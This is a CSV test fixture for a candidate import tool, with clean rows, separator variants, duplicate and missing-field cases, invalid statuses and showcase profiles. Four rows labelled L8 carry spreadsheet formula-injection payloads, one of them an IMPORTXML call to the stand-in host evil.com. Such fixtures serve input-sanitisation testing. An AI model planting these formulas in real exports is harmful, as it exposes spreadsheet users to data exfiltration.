name,email,phone,skills,experience,status,source,location,type,notes
Aarav Shah,aarav.shah.l1.0@test.com,9876540000,"Python,Machine Learning,AI",1,New,LinkedIn,Chennai,Trainer,L1 clean record 0
Priya Sharma,priya.sharma.l1.1@test.com,9876540001,"React,TypeScript,Node.js",2,Under Review,Referral,Bangalore,Consultant,L1 clean record 1
Rahul Kumar,rahul.kumar.l1.2@test.com,9876540002,"AWS,Kubernetes,Docker",3,Shortlisted,WhatsApp,Mumbai,Employee,L1 clean record 2
Meera Pillai,meera.pillai.l1.3@test.com,9876540003,NLP;BERT;LLMs,4,Approved,Job Portal,Delhi,Speaker,L1 clean record 3
Arjun Singh,arjun.singh.l1.4@test.com,9876540004,Java/Spring Boot/SQL,5,Engaged,Email,Hyderabad,Freelancer,L1 clean record 4
Divya Nair,divya.nair.l1.5@test.com,9876540005,"Figma,UI/UX,Design Systems",6,Rejected,Manual,Pune,Contractor,L1 clean record 5
Karthik Rajan,karthik.rajan.l1.6@test.com,9876540006,"Data Science,Tableau,Power BI",7,New,LinkedIn,Kolkata,Mentor,L1 clean record 6
Sneha Patel,sneha.patel.l1.7@test.com,9876540007,Flutter/Dart/Firebase,8,Under Review,Referral,Jaipur,Other,L1 clean record 7
Vikram Rao,vikram.rao.l1.8@test.com,9876540008,"Leadership,Coaching,Agile",9,Shortlisted,WhatsApp,Chennai,Trainer,L1 clean record 8
Ananya Gupta,ananya.gupta.l1.9@test.com,9876540009,"DevOps,Terraform,Ansible",10,Approved,Job Portal,Bangalore,Consultant,L1 clean record 9
Comma Sep,comma.sep@test.com,9000000001,"Python,AI,Cloud",3,New,Manual,Chennai,Trainer,L2 comma separator
Slash Sep,slash.sep@test.com,9000000002,Python/AI/Cloud,3,New,Manual,Mumbai,Trainer,L2 slash separator
Semi Sep,semi.sep@test.com,9000000003,Python;AI;Cloud,3,New,Manual,Delhi,Trainer,L2 semicolon separator
Pipe Sep,pipe.sep@test.com,9000000004,Python|AI|Cloud,3,New,Manual,Pune,Trainer,L2 pipe separator
Mixed Sep,mixed.sep@test.com,9000000005,"Python, AI/ML;Cloud|DevOps",3,New,Manual,Bangalore,Trainer,L5 mixed separators
Ampersand Sep,amp.sep@test.com,9000000006,NLP & LLM,4,New,Manual,Chennai,Consultant,L5 ampersand
Duplicate Person,aarav.shah.l1.0@test.com,9000000007,Python,5,New,LinkedIn,Mumbai,Consultant,L3 DUPLICATE EMAIL
,missingnameonly@test.com,9000000008,Python,2,New,Manual,Delhi,Trainer,L4 MISSING NAME - should skip
Has Name Only,,,React,3,New,LinkedIn,Pune,Employee,L4 missing email and phone - valid row
Bad Status,badstatus@test.com,9000000009,Python,4,Super Approved,Manual,Chennai,Trainer,L7 invalid status - should map to New
Empty Status,emptystatus@test.com,9000000010,React,3,,LinkedIn,Bangalore,Employee,L7 empty status - should default to New
"=IMPORTXML(""evil.com"",""//secret"")",injection1@test.com,9000000011,Python,3,New,Manual,Chennai,Trainer,L8 formula injection 1
"+SUM(A1:B1) attack",injection2@test.com,9000000012,React,3,New,Manual,Mumbai,Employee,L8 formula injection 2
"-SUM() formula",injection3@test.com,9000000013,Java,3,New,Manual,Delhi,Consultant,L8 formula injection 3
"@malicious formula",injection4@test.com,9000000014,Go,3,New,Manual,Hyderabad,Trainer,L8 at sign injection
Aarav Shah Demo1,aarav.shah.demo1.0@showcase.com,8765430000,"Python,Machine Learning,Deep Learning",1,New,LinkedIn,Chennai,Trainer,Showcase profile 1
Priya Sharma Demo2,priya.sharma.demo2.1@showcase.com,8765430001,"React,Node.js,TypeScript",1,New,Referral,Bangalore,Trainer,Showcase profile 2
Rahul Kumar Demo3,rahul.kumar.demo3.2@showcase.com,8765430002,"AWS,Azure,Kubernetes",1,Under Review,WhatsApp,Mumbai,Trainer,Showcase profile 3
Meera Pillai Demo4,meera.pillai.demo4.3@showcase.com,8765430003,"NLP,BERT,LLMs,PyTorch",1,Under Review,Job Portal,Delhi,Trainer,Showcase profile 4
Arjun Singh Demo5,arjun.singh.demo5.4@showcase.com,8765430004,"Public Speaking,Innovation,Digital Transformation",1,Shortlisted,Email,Hyderabad,Trainer,Showcase profile 5
